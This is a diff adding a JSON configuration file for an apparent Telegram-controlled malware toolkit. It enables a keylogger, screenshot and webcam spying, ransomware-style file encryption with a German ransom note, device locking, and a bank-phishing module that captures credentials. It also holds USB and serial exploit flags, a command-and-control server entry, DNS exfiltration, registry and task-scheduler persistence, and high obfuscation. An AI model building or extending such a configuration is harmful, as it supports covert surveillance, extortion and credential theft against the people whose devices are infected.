@@ -1,0 +1,121 @@
+{
+  "telegram": {
+    "bot_token": "YOUR_BOT_TOKEN_HERE",
+    "master_id": 123456789,
+    "channel_id": -1001234567890,
+    "allowed_users": [987654321, 555555555],
+    "admin_chat_id": 123456789,
+    "log_channel_id": -1009876543210
+  },
+  
+  "encryption": {
+    "aes_key": "32_byte_key_for_AES_256_encryption!!",
+    "rsa_key_size": 2048,
+    "encryption_method": "AES-256-GCM",
+    "key_rotation_days": 30,
+    "backup_keys": true
+  },
+  
+  "system": {
+    "data_dir": "data",
+    "log_dir": "logs",
+    "backup_dir": "backups",
+    "temp_dir": "temp",
+    "config_dir": "configs",
+    "max_log_size_mb": 100,
+    "log_retention_days": 30,
+    "auto_clean_temp": true
+  },
+  
+  "modules": {
+    "datensammler": {
+      "enabled": true,
+      "screenshot_interval": 60,
+      "keylogger_enabled": true,
+      "webcam_enabled": true,
+      "max_file_size_mb": 50
+    },
+    
+    "factoryreset": {
+      "enabled": true,
+      "require_confirmation": true,
+      "backup_before_reset": true,
+      "wipe_method": "secure"
+    },
+    
+    "files_sperren": {
+      "enabled": true,
+      "encryption_method": "AES-256",
+      "default_targets": ["Documents", "Desktop", "Downloads"],
+      "ransom_note": "Ihre Dateien wurden verschlüsselt!"
+    },
+    
+    "geraet_sperren": {
+      "enabled": true,
+      "lock_method": "registry",
+      "lock_message": "Dieses Gerät wurde gesperrt!",
+      "unlock_password": "default123"
+    },
+    
+    "telegram_bank_bot": {
+      "enabled": false,
+      "phishing_sites": [],
+      "capture_credentials": true,
+      "auto_transfer": false
+    },
+    
+    "UltimateHardwareExploid": {
+      "enabled": true,
+      "usb_exploit": true,
+      "bluetooth_exploit": false,
+      "serial_exploit": true
+    },
+    
+    "webcam_remote": {
+      "enabled": true,
+      "capture_interval": 10,
+      "save_to_disk": true,
+      "stream_quality": "medium"
+    }
+  },
+  
+  "network": {
+    "proxy_enabled": false,
+    "proxy_url": "socks5://user:pass@host:port",
+    "tor_enabled": false,
+    "dns_exfiltration": false,
+    "c2_server": "https://your-c2-server.com",
+    "heartbeat_interval": 60
+  },
+  
+  "security": {
+    "require_authentication": true,
+    "two_factor_auth": false,
+    "ip_whitelist": [],
+    "ip_blacklist": [],
+    "rate_limit_requests": 10,
+    "rate_limit_period": 60,
+    "encrypt_local_data": true
+  },
+  
+  "deployment": {
+    "auto_update": true,
+    "update_channel": "stable",
+    "persistence_method": "registry",
+    "startup_method": "task_scheduler",
+    "obfuscation_level": "high"
+  },
+  
+  "monitoring": {
+    "enable_monitoring": true,
+    "check_interval": 300,
+    "alert_on_intrusion": true,
+    "notify_master": true,
+    "log_system_metrics": true
+  },
+  
+  "version": "1.0.0",
+  "last_updated": "2024-01-01T00:00:00Z",
+  "debug_mode": false,
+  "safe_mode": false
+}
